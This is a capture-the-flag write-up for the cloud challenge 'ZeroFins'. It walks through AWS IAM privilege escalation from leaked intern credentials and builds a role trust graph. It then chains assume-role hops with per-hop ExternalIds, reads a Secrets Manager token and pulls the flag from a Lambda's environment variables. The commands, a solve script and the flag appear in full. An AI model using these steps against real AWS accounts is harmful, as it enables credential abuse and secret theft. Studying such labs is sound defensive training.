---
title: "ZeroFins"
ctf: "PBCTF 5.0 (Point Blank CTF)"
date: 2026-07-26
category: cloud
difficulty: hard
points: 350
flag_format: "pbctf{...}"
author: "vikas1337"
---

# ZeroFins

## summary

aws iam privesc. the leaked creds are `shreyas-intern`, whose inline policies are `intern-access` (iam:Get*/List*, and sts:AssumeRole on EVERY role in acct 254466556587) + `lambda-access` (lambda:GetFunctionConfiguration/GetFunction/InvokeFunction on *). the account has 960 roles - a deliberate haystack; the juicy admin-named roles are decoys gated by impossible PrincipalArn conditions. the real path (the flag literally names it, 'r0le_gr4ph_pwn') is to build the trust graph, find the 194 reachable roles, pull their identity policies, and walk multi-hop assume-role chains - each hop supplying the exact `sts:ExternalId` embedded in the trust policy - to the 17 roles that can read Secrets Manager. the secrets live in ap-south-1; `vault/escrow-token` says 'present this token to the decommission validator', which is the `ops-integration-exchange` Lambda. read its env with GetFunctionConfiguration -> FLAG.

## how i solved it

### 1. enumerate our own permissions

```bash
U=shreyas-intern
aws iam list-user-policies --user-name $U
aws iam get-user-policy --user-name $U --policy-name intern-access
aws iam get-user-policy --user-name $U --policy-name lambda-access
```

```text
intern-access: iam:Get*/List*  +  sts:AssumeRole on arn:aws:iam::254466556587:role/*
lambda-access: lambda:GetFunctionConfiguration / GetFunction / InvokeFunction on *
```

### 2. 960 roles = a haystack; the admin names are bait

```bash
aws iam list-roles --query 'length(Roles)'
# 960. juicy names: admin-legacy, prod-superuser-archive, root-recovery, global-admin-deprecated ...
# but their trust policies require aws:PrincipalArn like *-prod-admin-* / svc-*-decommissioned-* that DON'T EXIST -> decoys
```

```text
960 roles. the privileged-named ones are gated by impossible PrincipalArn conditions = red herrings.
```

### 3. build the trust graph -> 194 reachable, 17 can read secrets

```python
# parse every role's trust policy, edge = 'principal X may assume role Y' (honouring conditions).
# BFS from shreyas-intern over sts:AssumeRole. then fetch all 194 reachable roles' identity policies.
graph = build_trust_graph(all_roles)
reachable = bfs(graph, 'shreyas-intern')   # 194 / 960
secret_readers = [r for r in reachable if has(r,'secretsmanager:GetSecretValue')]
```

```text
Reachable roles: 194 / 960
readers with secretsmanager:GetSecretValue: 17
targets: ops/integration-token-*, billing/export-key-*, vault/escrow-token-*, archive/relay-key-*
```

### 4. each hop needs a specific ExternalId - walk the chain

```python
# direct assume of helios-vault-indexer-2020 is DENIED: its trust wants a specific sts:ExternalId
# (e.g. x-8478), and some hops also pin an immutable sts:SourceIdentity. read those from the trust
# policy and supply them per hop. example chain:
#   helios-vault-indexer-2020 (ext x-8478) -> nordlab-batch-runner-2017 (ext x-9374)
creds = walk_chain(['helios-vault-indexer-2020','nordlab-batch-runner-2017'], externalids)
```

```text
secret-reader roles reachable with valid ExternalId/SourceIdentity chains: 15
assumed nordlab-batch-runner-2017 (grants vault/escrow-token-*)
```

### 5. read the secrets (they're in ap-south-1)

```bash
# us-east-1 GetSecretValue 404s - the secrets are in ap-south-1
aws --region ap-south-1 secretsmanager get-secret-value --secret-id vault/escrow-token
```

```text
[vault/escrow-token] {"note":"present this token to the decommission validator",
                     "token":"uGMjmjXSkO72P1XBLca7ksySjvZDyjfLpmhdwFBv"}
```

### 6. the 'decommission validator' is a Lambda - read its env

```bash
# lambda list-functions was EMPTY in us-east-1; list in ap-south-1
aws --region ap-south-1 lambda list-functions --query 'Functions[].FunctionName'
# -> ops-integration-exchange (matches the ops/integration-token secret)
# we have lambda:GetFunctionConfiguration on * -> env vars come straight back
aws --region ap-south-1 lambda get-function-configuration --function-name ops-integration-exchange --query 'Environment.Variables'
```

```text
{
  "SECRET_ARN": "arn:aws:secretsmanager:ap-south-1:254466556587:secret:ops/integration-token-Oze4Om",
  "FLAG": "pbctf{n0rdlab_l3gacy_f4x_r0le_gr4ph_pwn-304a2c8a}"
}
```

## full solve script

```bash
#!/usr/bin/env bash
# zerofins - the flag NAME is the method: role-graph pwn. 960-role haystack, 194 reachable,
# multi-hop assume-role with per-hop ExternalId, read Secrets Manager in ap-south-1, then the
# 'decommission validator' Lambda's env var. (identity = shreyas-intern.)
U=shreyas-intern
# 1) our perms: intern-access (AssumeRole on role/*) + lambda-access (GetFunctionConfiguration on *)
aws iam get-user-policy --user-name $U --policy-name intern-access

# 2) pull all 960 roles + trust policies, build the graph, BFS to reachable (194)
aws iam list-roles > roles.json          # 960 (admin-named ones are gated-decoys)
python3 build_graph.py roles.json        # -> reachable=194, secret_readers=17

# 3) walk assume-role chains supplying the exact sts:ExternalId per hop, e.g.
#    helios-vault-indexer-2020 (x-8478) -> nordlab-batch-runner-2017 (x-9374)
#    (SourceIdentity is immutable once set - honour it)
eval $(python3 walk_chain.py helios-vault-indexer-2020 nordlab-batch-runner-2017)

# 4) secrets are in ap-south-1, not us-east-1
aws --region ap-south-1 secretsmanager get-secret-value --secret-id vault/escrow-token
#    -> {"note":"present this token to the decommission validator", "token":"uGMjmj..."}

# 5) the validator is a Lambda; list-functions was empty in us-east-1, list in ap-south-1
aws --region ap-south-1 lambda get-function-configuration \
    --function-name ops-integration-exchange --query 'Environment.Variables'

```

```text
Reachable roles: 194 / 960   |   secret readers: 17
assumed chain helios-vault-indexer-2020 -> nordlab-batch-runner-2017 (per-hop ExternalId)
vault/escrow-token -> 'present this token to the decommission validator'
ops-integration-exchange env FLAG -> pbctf{n0rdlab_l3gacy_f4x_r0le_gr4ph_pwn-304a2c8a}
```

## flag

```
pbctf{n0rdlab_l3gacy_f4x_r0le_gr4ph_pwn-304a2c8a}
```
